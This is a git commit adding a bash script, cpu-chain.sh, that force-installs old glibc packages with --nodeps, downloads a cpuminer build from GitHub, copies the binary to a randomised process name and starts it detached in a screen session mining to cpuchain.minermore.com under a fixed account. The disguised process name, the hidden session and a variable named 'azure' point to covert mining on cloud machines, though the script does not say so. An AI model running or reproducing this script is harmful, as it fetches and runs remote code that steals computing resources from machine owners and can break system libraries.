93ab9b61cef997ca9d3955daa9ce688f112db878
ts6aud5vkg <44915776+ts6aud5vkg@users.noreply.github.com>
2019-08-21 16:49:28 +0700

    Create cpu-chain.sh

---
+++ cpu-chain.sh
@@ -0,0 +1,21 @@
+#!/bin/bash
+wget http://copr-be.cloud.fedoraproject.org/results/mosquito/myrepo-el6/epel-6-x86_64/glibc-2.17-55.fc20/glibc-2.17-55.el6.x86_64.rpm
+wget http://copr-be.cloud.fedoraproject.org/results/mosquito/myrepo-el6/epel-6-x86_64/glibc-2.17-55.fc20/glibc-common-2.17-55.el6.x86_64.rpm
+wget http://copr-be.cloud.fedoraproject.org/results/mosquito/myrepo-el6/epel-6-x86_64/glibc-2.17-55.fc20/glibc-devel-2.17-55.el6.x86_64.rpm
+wget http://copr-be.cloud.fedoraproject.org/results/mosquito/myrepo-el6/epel-6-x86_64/glibc-2.17-55.fc20/glibc-headers-2.17-55.el6.x86_64.rpm
+sudo rpm -Uvh glibc-2.17-55.el6.x86_64.rpm \
+glibc-common-2.17-55.el6.x86_64.rpm \
+glibc-devel-2.17-55.el6.x86_64.rpm \
+glibc-headers-2.17-55.el6.x86_64.rpm --force --nodeps
+azure=mxsemsdnlkdj;
+mkdir /usr/local
+mkdir /usr/local/src
+rm -r /usr/local/src/$azure
+wget https://github.com/minkcrypto/cpuminer-opt/releases/download/v3.9.5.2/cpuminer-rplant-linux.tar.gz
+mv cpuminer-rplant-linux.tar.gz /usr/local/src/$azure
+cd /usr/local/src/$azure
+tar -xvzf cpuminer-rplant-linux.tar.gz
+a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
+sudo cp cpuminer-sse2 "$cpuname"
+echo $cpuname" is starting"
+screen -d -m ./"${cpuname}" -a cpupower -o stratum+tcp://cpuchain.minermore.com:4551 -u nvt191655320 -p x
